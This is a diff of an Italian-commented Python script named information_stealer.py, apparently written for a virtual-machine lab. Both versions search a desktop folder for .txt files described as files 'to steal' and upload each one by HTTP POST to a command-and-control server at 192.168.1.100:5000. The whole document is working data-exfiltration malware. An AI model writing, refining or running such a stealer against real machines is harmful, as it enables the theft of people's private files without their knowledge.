@@ -1,39 +1,42 @@
-# information_stealer.py
 import os
 import requests
 
-# Configura l'URL del server C2
-C2_URL = "http://192.168.1.100/upload"  # Sostituisci con l'IP del tuo server
+# Configura il server C2 (modifica con il tuo IP)
+C2_URL = "http://192.168.1.100:5000/upload"  # L'IP del server Flask dove ricevi i file
 
-# Directory che contiene i file da rubare
-TARGET_DIR = os.path.expanduser("~/Desktop/prova")
+# Directory contenente i file da rubare
+TARGET_DIR = r"C:\Users\vboxuser\Desktop\prova"  # Cambia il percorso della cartella
 
-# Trova i file .txt nella directory specificata
 def find_txt_files(directory):
-    txt_files = []
+    """Trova i file .txt nella cartella specificata."""
+    files_to_steal = []
     for root, _, files in os.walk(directory):
         for file in files:
-            if file.endswith(".txt"):
-                txt_files.append(os.path.join(root, file))
-    return txt_files
+            if file.endswith(".txt"):  # Filtra i file con estensione .txt
+                files_to_steal.append(os.path.join(root, file))
+    return files_to_steal
 
-# Invia il file al server
-def send_file_to_c2(file_path):
-    with open(file_path, 'rb') as f:
-        files = {'file': f}
+def send_file(file_path):
+    """Invia il file al server C2."""
+    with open(file_path, 'rb') as file:
+        # Invia il file al server Flask
+        files = {'file': (os.path.basename(file_path), file)}
         response = requests.post(C2_URL, files=files)
-    return response.status_code
+        return response.status_code
 
 if __name__ == "__main__":
-    # Trova tutti i file .txt nella cartella di prova
+    # Trova i file da rubare
     files = find_txt_files(TARGET_DIR)
-    print(f"Trovati {len(files)} file da inviare.")
+    print(f"Trovati {len(files)} file da rubare.")
 
-    # Invia ogni file al server C2
-    for file in files:
-        print(f"Inviando {file}...")
-        status = send_file_to_c2(file)
-        if status == 200:
-            print(f"File {file} inviato con successo!")
-        else:
-            print(f"Errore nell'invio di {file}: {status}")
+    if files:
+        # Invia ciascun file al server
+        for file in files:
+            print(f"Inviando {file}...")
+            status = send_file(file)
+            if status == 200:
+                print(f"File {file} inviato con successo.")
+            else:
+                print(f"Errore durante l'invio di {file}: {status}")
+    else:
+        print("Nessun file .txt trovato.")
